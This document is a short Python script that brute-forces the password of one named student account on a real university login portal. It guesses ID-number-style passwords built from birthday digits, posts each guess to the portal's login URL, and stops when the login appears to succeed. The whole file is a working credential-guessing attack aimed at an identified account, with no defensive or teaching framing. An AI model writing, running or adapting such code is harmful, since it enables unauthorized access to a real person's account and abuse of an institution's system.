import requests
birthday=input('输入生日最后两位数字')
a=(birthday+str(a)+str(b)+str(c)+j for a in range(0,10) for b in range(0,10) for c in range(1,10) for j in ['0','1','2','3','4','5','6','7','8','9','X'] )
count=0
for i in a:
#wc107216
    try:
        dict_login={'username':'12016154087','password':'%s'%i,'lt':'_c74068A09-789B-0E69-D421-7ADF02DF3509_kDA61AC4C-6991-6F64-E092-5E366E7510D8','_eventId':'submit','submit':"+"}
        res=requests.post('http://my.sju.js.cn/c/portal/login?redirect=%2Fgroup%2F10172%2F1&p_l_id=17538',data=dict_login)
        count=count+1
        print(count,i)
        if '忘记密码' not in res.text:
            print('密码是%s'%i)
            break
    except:
        print(count)
